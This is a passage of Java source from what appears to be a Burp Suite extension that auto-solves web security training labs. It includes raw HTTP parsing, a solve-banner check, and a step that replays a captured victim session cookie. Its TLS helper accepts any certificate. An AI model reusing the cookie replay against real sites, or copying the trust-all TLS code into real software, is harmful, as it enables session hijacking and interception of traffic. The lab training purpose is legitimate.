    private void verifySolvedH2(String baseUrl, HttpService service)
    {
        log("Verifying lab status");
        HttpResponse response = sendSimpleH2Request(service, "GET", "/");
        if (response.bodyToString().contains("Congratulations, you solved the lab!"))
        {
            log("Lab solved: " + baseUrl);
            return;
        }
        log("Action completed, but the solve banner was not detected yet");
    }

    private void verifySolvedH1(String baseUrl, HttpService service, String victimSession)
    {
        log("Verifying lab status");
        HttpRequest request = httpRequest(service,
            "GET / HTTP/1.1\r\n" +
                "Host: " + authority(service) + "\r\n" +
                "User-Agent: " + USER_AGENT + "\r\n" +
                "Cookie: session=" + victimSession + "\r\n" +
                "Connection: close\r\n\r\n");
        HttpResponse response = sendHttp1(request, 15_000).response();
        if (response != null && response.bodyToString().contains("Congratulations, you solved the lab!"))
        {
            log("Lab solved: " + baseUrl);
            return;
        }
        log("Victim cookie replay completed, but the solve banner was not detected yet");
    }

    private String normalizeBaseUrl(String baseUrl)
    {
        String trimmed = baseUrl.trim();
        if (!trimmed.startsWith("http://") && !trimmed.startsWith("https://"))
        {
            throw new IllegalArgumentException("URL must start with http:// or https://");
        }
        return trimmed.endsWith("/") ? trimmed.substring(0, trimmed.length() - 1) : trimmed;
    }

    private HttpService serviceFromBaseUrl(String baseUrl)
    {
        String withoutScheme = baseUrl.replaceFirst("^https?://", "");
        boolean secure = baseUrl.startsWith("https://");
        String host = withoutScheme;
        int port = secure ? 443 : 80;

        int slash = host.indexOf('/');
        if (slash >= 0)
        {
            host = host.substring(0, slash);
        }

        int colon = host.lastIndexOf(':');
        if (colon > 0)
        {
            port = Integer.parseInt(host.substring(colon + 1));
            host = host.substring(0, colon);
        }

        return httpService(host, port, secure);
    }

    private String authority(HttpService service)
    {
        boolean defaultPort = (service.secure() && service.port() == 443) || (!service.secure() && service.port() == 80);
        return defaultPort ? service.host() : service.host() + ":" + service.port();
    }

    private String toBaseUrl(String fullUrl)
    {
        String trimmed = fullUrl.trim();
        int schemeEnd = trimmed.indexOf("://");
        if (schemeEnd < 0)
        {
            return trimmed;
        }

        int slash = trimmed.indexOf('/', schemeEnd + 3);
        return slash >= 0 ? trimmed.substring(0, slash) : trimmed;
    }

    private String snippetAroundSearchResult(String text)
    {
        int idx = text.toLowerCase().indexOf("search results for");
        if (idx < 0)
        {
            return text.substring(0, Math.min(1200, text.length()));
        }

        int start = Math.max(0, idx - 120);
        int end = Math.min(text.length(), idx + 900);
        return text.substring(start, end);
    }

    private String joinLengths(int[] lengths)
    {
        StringBuilder builder = new StringBuilder();
        for (int i = 0; i < lengths.length; i++)
        {
            if (i > 0)
            {
                builder.append(", ");
            }
            builder.append(lengths[i]);
        }
        return builder.toString();
    }

    private String jsString(String value)
    {
        return value
            .replace("\\", "\\\\")
            .replace("`", "\\`")
            .replace("\r", "\\r")
            .replace("\n", "\\n");
    }

    private String jsQuote(String value)
    {
        return "'" + value
            .replace("\\", "\\\\")
            .replace("'", "\\'")
            .replace("\r", "\\r")
            .replace("\n", "\\n") + "'";
    }

    private SSLSocket openTlsSocket(HttpService service, int timeoutMs) throws Exception
    {
        SSLContext context = SSLContext.getInstance("TLS");
        context.init(null, new TrustManager[]{new X509TrustManager()
        {
            @Override
            public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType)
            {
            }

            @Override
            public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType)
            {
            }

            @Override
            public java.security.cert.X509Certificate[] getAcceptedIssuers()
            {
                return new java.security.cert.X509Certificate[0];
            }
        }}, new SecureRandom());

        SSLSocketFactory factory = context.getSocketFactory();
        SSLSocket socket = (SSLSocket) factory.createSocket(service.host(), service.port());
        socket.setSoTimeout(timeoutMs);
        socket.startHandshake();
        return socket;
    }

    private RawHttpResponse readRawHttpResponse(InputStream in, int timeoutMs) throws Exception
    {
        byte[] headerBytes = readUntil(in, "\r\n\r\n".getBytes(StandardCharsets.UTF_8));
        String headerText = new String(headerBytes, StandardCharsets.ISO_8859_1);
        String[] lines = headerText.split("\r\n");
        if (lines.length == 0)
        {
            throw new IllegalStateException("Empty HTTP/1 response");
        }

        String[] statusParts = lines[0].split(" ");
        if (statusParts.length < 2)
        {
            throw new IllegalStateException("Malformed status line: " + lines[0]);
        }

        int statusCode = Integer.parseInt(statusParts[1]);
        Map<String, String> headers = new LinkedHashMap<>();
        for (int i = 1; i < lines.length; i++)
        {
            String line = lines[i];
            int colon = line.indexOf(':');
            if (colon <= 0)
            {
                continue;
            }
            headers.put(line.substring(0, colon).trim().toLowerCase(), line.substring(colon + 1).trim());
        }

        byte[] body;
        if ("chunked".equalsIgnoreCase(headers.getOrDefault("transfer-encoding", "")))
        {
            body = readChunkedBody(in);
        }
        else
        {
            int contentLength = 0;
            if (headers.containsKey("content-length"))
            {
                contentLength = Integer.parseInt(headers.get("content-length"));
            }
            body = readFixedLength(in, contentLength);
        }

        return new RawHttpResponse(statusCode, headers, body);
    }

    private byte[] readUntil(InputStream in, byte[] marker) throws Exception
    {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int matched = 0;
        while (true)
        {
            int value = in.read();
            if (value < 0)
            {
                throw new IllegalStateException("Unexpected EOF while reading response headers");
            }
            out.write(value);
            if ((byte) value == marker[matched])
            {
                matched++;
                if (matched == marker.length)
                {
                    return out.toByteArray();
                }
            }
            else
            {
                matched = ((byte) value == marker[0]) ? 1 : 0;
            }
        }
    }

    private byte[] readFixedLength(InputStream in, int length) throws Exception
    {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        for (int remaining = length; remaining > 0; )
        {
            byte[] buffer = new byte[Math.min(remaining, 4096)];
            int read = in.read(buffer);
            if (read < 0)
            {
                break;
            }
            out.write(buffer, 0, read);
            remaining -= read;
        }
        return out.toByteArray();
    }

    private byte[] readChunkedBody(InputStream in) throws Exception
    {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        while (true)
        {
            String line = readLine(in);
            int chunkSize = Integer.parseInt(line.trim(), 16);
            if (chunkSize == 0)
            {
                readLine(in);
                return out.toByteArray();
            }

            byte[] chunk = readFixedLength(in, chunkSize);
            out.write(chunk);
            readLine(in);
        }
    }

    private String readLine(InputStream in) throws Exception
    {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int previous = -1;
        while (true)
        {
            int value = in.read();
            if (value < 0)
            {
                throw new IllegalStateException("Unexpected EOF while reading line");
            }
            if (previous == '\r' && value == '\n')
            {
                byte[] bytes = out.toByteArray();
                return new String(bytes, 0, Math.max(0, bytes.length - 1), StandardCharsets.ISO_8859_1);
            }
            out.write(value);
            previous = value;
        }
    }

    private void setUrl(String value)
    {
        SwingUtilities.invokeLater(() -> urlField.setText(value));
    }

    private void setMode(SolverMode mode)
    {
        SwingUtilities.invokeLater(() -> modeCombo.setSelectedItem(mode));
    }

    private void setBusy(boolean busy)
    {
        SwingUtilities.invokeLater(() -> {
            solveButton.setEnabled(!busy);
            modeCombo.setEnabled(!busy);
        });
    }

    private void log(String message)
    {
        String line = "[" + LocalTime.now().format(TIME_FORMAT) + "] " + message;
        if (api != null)
        {
            api.logging().logToOutput(line);
        }
        if (logArea == null)
        {
            return;
        }

        SwingUtilities.invokeLater(() -> {
            logArea.append(line);
            logArea.append("\n");
            logArea.setCaretPosition(logArea.getDocument().getLength());
        });
    }
}
